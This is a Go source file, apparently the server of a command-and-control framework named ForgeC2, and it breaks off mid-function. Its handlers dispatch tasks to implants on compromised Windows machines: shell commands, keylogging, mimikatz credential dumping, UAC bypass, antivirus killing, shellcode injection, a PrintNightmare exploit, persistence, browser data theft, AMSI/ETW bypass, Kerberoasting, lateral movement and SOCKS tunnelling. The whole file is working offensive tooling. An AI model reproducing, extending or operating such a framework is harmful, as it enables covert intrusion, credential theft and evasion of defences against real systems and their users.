package server

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"log/slog"
	"net/http"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleShellPage(c *gin.Context) {
	id := c.Param("id")
	var agent db.Implant
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.String(http.StatusNotFound, "Agent not found")
		return
	}

	agent.Status = s.agentStatus(agent).Status

	stats := s.getNavStats()
	data := gin.H{
		"Title":     fmt.Sprintf("ForgeC2 - Shell %s", agent.Hostname),
		"ActiveNav": "agents",
		"Agent":     agent,
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPage(c, "shell_content", data)
}

func (s *Server) handleSendCommand(c *gin.Context) {
	id := c.Param("id")
	cmd := c.PostForm("command")
	shell := c.PostForm("shell")
	if shell == "" {
		shell = "cmd.exe"
	}

	slog.Info("handleSendCommand called", "agent_id", id, "command", cmd)

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "shell", cmd, shell, "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Task created successfully", "agent_id", id, "task_id", task.ID, "command", cmd)
	s.dispatchTask(c, task, "send_command", cmd)
}

func (s *Server) handleGetAgentTasks(c *gin.Context) {
	id := c.Param("id")

	var tasks []db.Task
	s.db.Where("agent_id = ?", id).
		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop", "ls"}).
		Order("created_at desc").Limit(AgentTasksLimit).Find(&tasks)

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "agent_tasks_list", gin.H{"Tasks": tasks}); err != nil {
		slog.Error("Failed to render tasks", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	c.Header("Content-Type", "text/html; charset=utf-8")
	c.String(http.StatusOK, contentBuf.String())
}

func (s *Server) handleGetTaskStatus(c *gin.Context) {
	taskID := c.Param("taskId")

	var task db.Task
	if err := s.db.Preload("Agent").First(&task, taskID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "task not found"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"id":      task.ID,
		"status":  task.Status,
		"result":  task.Result,
		"error":   task.Error,
		"command": task.Command,
		"type":    task.Type,
		"agent":   task.Agent.Hostname,
		"created": task.CreatedAt.Format("2006-01-02 15:04:05"),
	})
}

func (s *Server) handleRequestPS(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"ps", "request_ps", "process list"})
}

func (s *Server) handleSuspendProcess(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "suspend", target, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Suspend requested", "agent", id, "target", target)
	s.dispatchTask(c, task, "suspend_process", target)
}

func (s *Server) handleResumeProcess(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "resume", target, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Resume requested", "agent", id, "target", target)
	s.dispatchTask(c, task, "resume_process", target)
}

func (s *Server) handleKillProcess(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "killproc", target, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Kill process requested", "agent", id, "target", target)
	s.dispatchTask(c, task, "kill_process", target)
}

func (s *Server) handleClipboardGet(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"clipboard_get", "clipboard_get", ""})
}

func (s *Server) handleClipboardSet(c *gin.Context) {
	id := c.Param("id")
	data := c.PostForm("data")
	if data == "" {
		data = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "clipboard_set", data, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Clipboard set requested", "agent", id)
	s.dispatchTask(c, task, "clipboard_set", "")
}

func (s *Server) handleFindFiles(c *gin.Context) {
	id := c.Param("id")
	path := c.PostForm("path")
	pattern := c.PostForm("pattern")
	if path == "" {
		path = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "find", pattern, "", path, "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Find files requested", "agent", id, "path", path, "pattern", pattern)
	s.dispatchTask(c, task, "find_files", path+" "+pattern)
}

func (s *Server) handleRegGet(c *gin.Context) {
	id := c.Param("id")
	key := c.PostForm("key")
	if key == "" {
		key = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "reg_get", key, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Reg get requested", "agent", id, "key", key)
	s.dispatchTask(c, task, "reg_get", key)
}

func (s *Server) handleRegSet(c *gin.Context) {
	id := c.Param("id")
	path := c.PostForm("path")
	data := c.PostForm("data")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "reg_set", "", "", path, data, 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Reg set requested", "agent", id, "path", path)
	s.dispatchTask(c, task, "reg_set", path)
}

func (s *Server) handleRegDelete(c *gin.Context) {
	id := c.Param("id")
	key := c.PostForm("key")
	if key == "" {
		key = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "reg_delete", key, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Reg delete requested", "agent", id, "key", key)
	s.dispatchTask(c, task, "reg_delete", key)
}

func (s *Server) handleReboot(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"reboot", "reboot", ""})
}

func (s *Server) handleShutdown(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"shutdown", "shutdown", ""})
}

func (s *Server) handleListDrives(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"drives", "list_drives", ""})
}

func (s *Server) handleBeaconNow(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"beacon_now", "beacon_now", ""})
}

func (s *Server) handleListServices(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"services", "list_services", ""})
}

func (s *Server) handlePortScan(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "portscan", target, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Portscan requested", "agent", id, "target", target)
	s.dispatchTask(c, task, "portscan", target)
}

func (s *Server) handleNetstat(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"netstat", "netstat", ""})
}

func (s *Server) handleUsers(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"users", "users", ""})
}

func (s *Server) handleAV(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"av", "av", ""})
}

func (s *Server) handleDownloadURL(c *gin.Context) {
	id := c.Param("id")
	url := c.PostForm("url")
	dest := c.PostForm("dest")
	if url == "" {
		url = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "download_url", url, dest, dest, "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Download URL requested", "agent", id, "url", url)
	s.dispatchTask(c, task, "download_url", url+" -> "+dest)
}

func (s *Server) handleUninstall(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"uninstall", "uninstall", ""})
}

func (s *Server) handleSetSleep(c *gin.Context) {
	id := c.Param("id")
	sleep := c.PostForm("sleep")
	if sleep == "" {
		sleep = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "set_sleep", sleep, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Set sleep requested", "agent", id, "sleep", sleep)
	s.dispatchTask(c, task, "set_sleep", sleep)
}

func (s *Server) handleElevate(c *gin.Context) {
	id := c.Param("id")
	cmd := c.PostForm("cmd")
	if cmd == "" {
		cmd = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "elevate", cmd, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Elevate requested", "agent", id, "cmd", cmd)
	s.dispatchTask(c, task, "elevate", cmd)
}

func (s *Server) handleUACBypass(c *gin.Context) {
	id := c.Param("id")
	method := c.PostForm("method")
	if method == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "method is required (eventvwr, fodhelper, computerdefaults, sdclt, cmstp)"})
		return
	}
	payload := c.PostForm("payload")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	cmd := method + "|" + payload
	task, err := s.createTask(id, "uac_bypass", cmd, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create uac_bypass task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("UAC bypass requested", "agent", id, "method", method)
	s.LogAuditRecord(c, "uac_bypass", "agent", id, "UAC bypass: "+method, true, nil)
	s.dispatchTask(c, task, "uac_bypass", method)
}

func (s *Server) handleKillAV(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"kill_av", "kill_av", ""})
}

// Keylogger handlers (high-value addition)
func (s *Server) handleStartKeylogger(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "keylogger_start", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create keylogger start task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	s.LogAuditRecord(c, "keylogger_start", "agent", id, "Started keylogger", true, nil)
	slog.Info("Keylogger started", "agent", id)
	s.dispatchTask(c, task, "keylogger_start", "start")
}

func (s *Server) handleStopKeylogger(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "keylogger_stop", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create keylogger stop task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	s.LogAuditRecord(c, "keylogger_stop", "agent", id, "Stopped keylogger", true, nil)
	slog.Info("Keylogger stopped", "agent", id)
	s.dispatchTask(c, task, "keylogger_stop", "stop")
}

func (s *Server) handleDumpKeylogger(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "keylogger_dump", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create keylogger dump task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	s.LogAuditRecord(c, "keylogger_dump", "agent", id, "Dumped keylogger buffer", true, nil)
	slog.Info("Keylogger dump requested", "agent", id)
	s.dispatchTask(c, task, "keylogger_dump", "dump logs")
}

// === High value CS parity: 1(SOCKS),3(creds),4(inject),6(lateral) ===

func (s *Server) handleCredsDump(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"creds", "creds_dump", ""})
}

func (s *Server) handleInject(c *gin.Context) {
	id := c.Param("id")
	pidStr := c.PostForm("pid")
	tech := c.PostForm("tech")
	if tech == "" {
		tech = "createremotethread"
	}
	scB64 := c.PostForm("shellcode") // base64 shellcode
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	cmd := pidStr + "|" + tech
	task, err := s.createTask(id, "inject", cmd, "", "", scB64, 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Inject requested", "agent", id, "pid", pidStr, "tech", tech)
	s.dispatchTask(c, task, "inject", cmd)
}

func (s *Server) handleSpawn(c *gin.Context) {
	id := c.Param("id")
	target := c.PostForm("target")
	if target == "" {
		target = "rundll32.exe"
	}
	technique := c.PostForm("technique")
	if technique == "" {
		technique = "CreateRemoteThread"
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	_, b64Data, size, ok := s.handleFileUpload(c, "shellcode")
	if !ok {
		return
	}

	cmd := target + "|" + technique + "|" + b64Data
	task, err := s.createTask(id, "spawn", cmd, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Spawn requested", "agent", id, "target", target, "tech", technique, "size", size)
	s.LogAuditRecord(c, "spawn", "agent", id, fmt.Sprintf("Spawn: %s|%s (%d bytes shellcode)", target, technique, size), true, nil)
	s.dispatchTask(c, task, "spawn", fmt.Sprintf("%s|%s", target, technique))
}

func (s *Server) handleLateral(c *gin.Context) {
	id := c.Param("id")
	spec := c.PostForm("spec")
	if spec == "" {
		spec = c.PostForm("command")
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "lateral", spec, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Lateral movement requested", "agent", id, "spec", spec)
	s.dispatchTask(c, task, "lateral", spec)
}

func (s *Server) handleSocks(c *gin.Context) {
	id := c.Param("id")
	port := c.PostForm("port")
	if port == "" {
		port = c.PostForm("command")
	}
	if port == "" {
		port = "1080"
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	// Command carries the listen port on the *agent*
	task, err := s.createTask(id, "socks", port, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("SOCKS5 requested on agent", "agent", id, "port", port)
	s.dispatchTask(c, task, "socks", port)
}

// handleCancelTask cancels a pending or running task.
// POST /agents/:id/tasks/:taskId/cancel
func (s *Server) handleCancelTask(c *gin.Context) {
	agentID := c.Param("id")
	taskIDStr := c.Param("taskId")

	if _, ok := s.getAgentOrFail(c, agentID); !ok {
		return
	}

	var taskID uint
	if _, err := fmt.Sscanf(taskIDStr, "%d", &taskID); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid task id"})
		return
	}

	var task db.Task
	if err := s.db.First(&task, taskID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "task not found"})
		return
	}
	if task.AgentID != agentID {
		c.JSON(http.StatusForbidden, gin.H{"error": "task belongs to different agent"})
		return
	}

	if task.Status != "pending" && task.Status != "running" {
		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("task is %s, cannot cancel", task.Status)})
		return
	}

	s.db.Model(&task).Updates(map[string]interface{}{
		"status": "cancelled",
		"error":  "cancelled by operator",
	})

	slog.Info("Task cancelled", "agent", agentID, "task", taskID, "type", task.Type)
	s.LogAuditRecord(c, "cancel_task", "agent", agentID, fmt.Sprintf("Cancelled task #%d (%s)", taskID, task.Type), true, nil)
	s.broadcastTaskUpdate(agentID, task)
	c.JSON(http.StatusOK, gin.H{"success": true, "message": "Task cancelled"})
}

// handleRerunTask clones an existing task's parameters and creates a new pending task.
// POST /agents/:id/task/:taskId/rerun
func (s *Server) handleRerunTask(c *gin.Context) {
	agentID := c.Param("id")
	taskIDStr := c.Param("taskId")

	role, _ := c.Get("user_role")
	if role == "viewer" {
		c.JSON(http.StatusForbidden, gin.H{"error": "viewers cannot rerun tasks"})
		return
	}
	user, _ := c.Get("user")
	username := fmt.Sprintf("%v", user)
	if holder, ok := s.checkAgentLock(agentID, username); !ok {
		c.JSON(http.StatusLocked, gin.H{"error": fmt.Sprintf("agent已被 %s 锁定", holder), "locked_by": holder})
		return
	}

	if _, ok := s.getAgentOrFail(c, agentID); !ok {
		return
	}

	var taskID uint
	if _, err := fmt.Sscanf(taskIDStr, "%d", &taskID); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid task id"})
		return
	}

	var original db.Task
	if err := s.db.First(&original, taskID).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "original task not found"})
		return
	}

	// Only rerun tasks that belong to this agent
	if original.AgentID != agentID {
		c.JSON(http.StatusForbidden, gin.H{"error": "task belongs to different agent"})
		return
	}

	// Don't allow rerun of control/monitoring tasks
	noRerun := map[string]bool{
		"kill_agent": true, "screen_stream_start": true, "screen_stream_stop": true,
	}
	if noRerun[original.Type] {
		c.JSON(http.StatusBadRequest, gin.H{"error": "cannot rerun this task type"})
		return
	}

	// Clone the original task parameters
	newTask, err := s.createTask(agentID, original.Type, original.Command, original.Shell, original.Path, original.Data, original.Offset, original.Size)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("Task rerun", "agent", agentID, "original_task", taskID, "new_task", newTask.ID, "type", original.Type)
	s.dispatchTask(c, newTask, "rerun_"+original.Type, fmt.Sprintf("rerun of #%d", taskID))
}

// ── execute-assembly: Upload and execute .NET assembly ─────────────────────
func (s *Server) handleExecuteAssembly(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	filename, b64Data, size, ok := s.handleFileUpload(c, "assembly")
	if !ok {
		return
	}

	task, err := s.createTask(id, "execute_assembly", "", "", "", b64Data, 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Execute-assembly requested", "agent", id, "assembly", filename, "size", size)
	s.LogAuditRecord(c, "execute_assembly", "agent", id, fmt.Sprintf("Assembly: %s (%d bytes)", filename, size), true, nil)
	s.dispatchTask(c, task, "execute_assembly", filename)
}

// ── kerberoast: Request TGS hashes for all SPNs ────────────────────────────
func (s *Server) handleKerberoast(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "kerberoast", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Kerberoast requested", "agent", id)
	s.LogAuditRecord(c, "kerberoast", "agent", id, "Kerberoast requested", true, nil)
	s.dispatchTask(c, task, "kerberoast", "")
}

// ── mimikatz: Run mimikatz command ─────────────────────────────────────────
func (s *Server) handleMimikatz(c *gin.Context) {
	id := c.Param("id")
	command := c.PostForm("command")
	if command == "" {
		command = "sekurlsa::logonpasswords"
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "mimikatz", command, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Mimikatz requested", "agent", id, "command", command)
	s.LogAuditRecord(c, "mimikatz", "agent", id, fmt.Sprintf("Mimikatz: %s", command), true, nil)
	s.dispatchTask(c, task, "mimikatz", command)
}

// ── elevate_printnightmare: PrintNightmare exploit ─────────────────────────
func (s *Server) handleElevatePrintNightmare(c *gin.Context) {
	id := c.Param("id")
	dllPath := c.PostForm("dll_path")
	if dllPath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "dll_path is required (upload a malicious DLL first via File Browser)"})
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "elevate_printnightmare", dllPath, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("PrintNightmare exploit requested", "agent", id, "dll", dllPath)
	s.LogAuditRecord(c, "elevate_printnightmare", "agent", id, fmt.Sprintf("PrintNightmare DLL: %s", dllPath), true, nil)
	s.dispatchTask(c, task, "elevate_printnightmare", dllPath)
}

// ── Persistence Toolkit ──────────────────────────────────────────────────
func (s *Server) handlePersistence(c *gin.Context) {
	id := c.Param("id")
	action := c.PostForm("action")
	method := c.PostForm("method")
	binaryPath := c.PostForm("binary_path")

	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	switch action {
	case "add":
		if method == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "method is required"})
			return
		}
		cmd := method + "|" + binaryPath
		task, err := s.createTask(id, "persistence_add", cmd, "", "", "", 0, 0)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
			return
		}
		slog.Info("Persistence add requested", "agent", id, "method", method)
		s.LogAuditRecord(c, "persistence_add", "agent", id, "Persistence add: "+method, true, nil)
		s.dispatchTask(c, task, "persistence_add", method)

	case "list":
		task, err := s.createTask(id, "persistence_list", "", "", "", "", 0, 0)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
			return
		}
		slog.Info("Persistence list requested", "agent", id)
		s.LogAuditRecord(c, "persistence_list", "agent", id, "Persistence list", true, nil)
		s.dispatchTask(c, task, "persistence_list", "list")

	case "remove":
		if method == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "method is required"})
			return
		}
		cmd := method + "|" + binaryPath
		task, err := s.createTask(id, "persistence_remove", cmd, "", "", "", 0, 0)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
			return
		}
		slog.Info("Persistence remove requested", "agent", id, "method", method)
		s.LogAuditRecord(c, "persistence_remove", "agent", id, "Persistence remove: "+method, true, nil)
		s.dispatchTask(c, task, "persistence_remove", method)

	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid action: must be add, list, or remove"})
	}
}

// ── PowerPick: Execute PowerShell script in-process ───────────────────────
func (s *Server) handlePowerPick(c *gin.Context) {
	id := c.Param("id")
	script := c.PostForm("script")
	if script == "" {
		script = c.PostForm("command")
	}
	if script == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "script is required"})
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	b64Script := base64.StdEncoding.EncodeToString([]byte(script))
	task, err := s.createTask(id, "powerpick", b64Script, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create powerpick task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}

	slog.Info("PowerPick requested", "agent", id, "script_len", len(script))
	s.LogAuditRecord(c, "powerpick", "agent", id, fmt.Sprintf("PowerPick script (%d bytes)", len(script)), true, nil)
	s.dispatchTask(c, task, "powerpick", fmt.Sprintf("PowerPick (%d bytes)", len(script)))
}

// ── Browser Data Theft ────────────────────────────────────────────────────
func (s *Server) handleBrowserSteal(c *gin.Context) {
	id := c.Param("id")
	browser := c.PostForm("browser")
	if browser == "" {
		browser = "all"
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "browser_steal", browser, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create browser_steal task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Browser data theft requested", "agent", id, "browser", browser)
	s.LogAuditRecord(c, "browser_steal", "agent", id, "Browser steal: "+browser, true, nil)
	s.dispatchTask(c, task, "browser_steal", "Browser steal: "+browser)
}

// ── BOF: Upload and execute Beacon Object File ────────────────────────────
func (s *Server) handleNetCommand(c *gin.Context) {
	id := c.Param("id")
	command := c.PostForm("command")
	if command == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "command is required (e.g. view, group /domain, localgroup Administrators, user, accounts, share)"})
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "net", command, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create net task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Net command requested", "agent", id, "command", command)
	s.LogAuditRecord(c, "net", "agent", id, "Net: "+command, true, nil)
	s.dispatchTask(c, task, "net", "Net: "+command)
}

func (s *Server) handleBOF(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	filename, b64Data, size, ok := s.handleFileUpload(c, "bof")
	if !ok {
		return
	}
	args := c.PostForm("args")

	task, err := s.createTask(id, "bof", args, "", "", b64Data, 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("BOF execution requested", "agent", id, "file", filename, "size", size, "args", args)
	s.LogAuditRecord(c, "bof", "agent", id, fmt.Sprintf("BOF: %s (%d bytes) args=%s", filename, size, args), true, nil)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID, "message": fmt.Sprintf("BOF %s dispatched", filename)})
}

// ── AMSI/ETW Bypass ──────────────────────────────────────────────────────────

func (s *Server) handleAMSIByPass(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "amsi_bypass", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create amsi_bypass task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("AMSI bypass requested", "agent", id)
	s.LogAuditRecord(c, "amsi_bypass", "agent", id, "AMSI bypass requested", true, nil)
	s.dispatchTask(c, task, "amsi_bypass", "AMSI Bypass")
}

func (s *Server) handleETWByPass(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "etw_bypass", "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create etw_bypass task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("ETW bypass requested", "agent", id)
	s.LogAuditRecord(c, "etw_bypass", "agent", id, "ETW bypass requested", true, nil)
	s.dispatchTask(c, task, "etw_bypass", "ETW Bypass")
}

// ── Self-Update ───────────────────────────────────────────────────────────────

func (s *Server) handleSelfUpdate(c *gin.Context) {
	id := c.Param("id")
	url := c.PostForm("url")
	if url == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "download URL is required"})
		return
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "self_update", url, "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create self_update task", "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Self-update requested", "agent", id, "url", url)
	s.LogAuditRecord(c, "self_update", "agent", id, "Self-update: "+url, true, nil)
	s.dispatchTask(c, task, "self_update", "Self-Update ("+url+")")
}

// simpleTaskDef defines a basic task with no extra parameters
type simpleTaskDef struct {
	taskType string // e.g. "ps", "reboot"
	audit    string // e.g. "request_ps", "reboot"
	details  string // audit detail string
}

// createSimpleTask creates and dispatches a parameterless agent task
func (s *Server) createSimpleTask(c *gin.Context, id string, def simpleTaskDef) bool {
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return false
	}
	task, err := s.createTask(id, def.taskType, "", "", "", "", 0, 0)
	if err != nil {
		slog.Error("Failed to create task", "type", def.taskType, "agent_id", id, "error", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return false
	}
	slog.Info(def.taskType+" requested", "agent", id)
	s.dispatchTask(c, task, def.audit, def.details)
	return true
}

// handleFileUpload reads an uploaded file from a form field and returns base64 content.
// fieldName is the form field name (e.g. "shellcode", "assembly", "bof").
func (s *Server) handleFileUpload(c *gin.Context, fieldName string) (filename, b64Data string, size int64, ok bool) {
	file, err := c.FormFile(fieldName)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": fieldName + " file required"})
		return
	}
	if file.Size > MaxUploadSize {
		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("file too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
		return
	}
	f, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read " + fieldName})
		return
	}
	defer f.Close()
	data, err := io.ReadAll(f)
	if err != nil {
